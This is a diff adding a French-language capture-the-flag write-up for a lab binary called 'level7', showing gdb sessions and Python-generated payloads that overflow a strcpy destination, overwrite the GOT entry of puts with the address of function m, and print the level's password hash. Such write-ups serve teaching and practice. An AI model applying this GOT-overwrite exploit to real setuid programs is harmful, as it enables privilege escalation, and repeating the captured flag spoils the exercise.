@@ -1,0 +1,58 @@
+refs:
+1) https://www.youtube.com/watch?v=HPDBOhiKaD8
+2) https://www.youtube.com/watch?v=TfJrU95q1J4 
+========================================================================================
+
+Avec objdump -D on peut voir l'adresse de puts, puis obtenir l'adresse du got avec gdb:
+	(gdb) x 0x8049928
+	0x8049928 <puts@got.plt>:       0x08048406
+On va override cette adresse.
+
+On overflow sur le 1er arg jusqu'a obtenir un segfault:
+	$ gdb -q level7
+	(gdb) r AAAABBBBCCCCDDDDEEEEFFFF 11112222
+	Starting program: /home/user/level7/level7 AAAABBBBCCCCDDDDEEEEFFFF 11112222
+	Program received signal SIGSEGV, Segmentation fault.
+	0xb7eb8f92 in ?? () from /lib/i386-linux-gnu/libc.so.6
+
+On peut voir que le registre $edx contient nos "FFFF", c'est l'adresse de destination de strcpy qui a ete override:  
+	(gdb) i r
+	edx            0x46464646       1179010630
+
+On les remplace par l'adresse de puts, et pour ce test on remplace le fichier ouvert par notre fichier:
+	(gdb) r `python -c 'print "AAAABBBBCCCCDDDDEEEE\x28\x99\x04\x08"'` 11112222
+	Starting program: /home/user/level7/level7 `python -c 'print "AAAABBBBCCCCDDDDEEEE\x28\x99\x04\x08"'` 11112222
+	Breakpoint 1, 0x080485d3 in main ()
+	(gdb) set {char [10]} 0x80486eb = "/tmp/pass"
+	(gdb) c
+	Continuing.
+
+	Program received signal SIGSEGV, Segmentation fault.
+	0x31313131 in ?? ()
+
+On plante sur 0x31313131, nos "1111" dans le 2eme arg!
+	(gdb) i r
+	eip            0x31313131       0x31313131
+
+On peut voir qu'on a bien override le got de puts:
+	(gdb) x 0x8049928
+	0x8049928 <puts@got.plt>:       0x31313131
+
+On refait la meme chose en remplacant les 1111 par l'adresse de la fonction m:
+	(gdb) x m
+	0x80484f4 <m>:  0x83e58955
+	(gdb) r `python -c 'print "AAAABBBBCCCCDDDDEEEE\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
+	Starting program: /home/user/level7/level7 `python -c 'print "AAAABBBBCCCCDDDDEEEE\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
+
+	Breakpoint 1, 0x080485d3 in main ()
+	(gdb) set {char [10]} 0x80486eb = "/tmp/pass"
+	(gdb) c
+	Continuing.
+	password
+	- 1550940068
+
+On test sans gdb pour avoir le suid:
+ ./level7 `python -c 'print "AAAABBBBCCCCDDDDEEEE\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1550940625
+
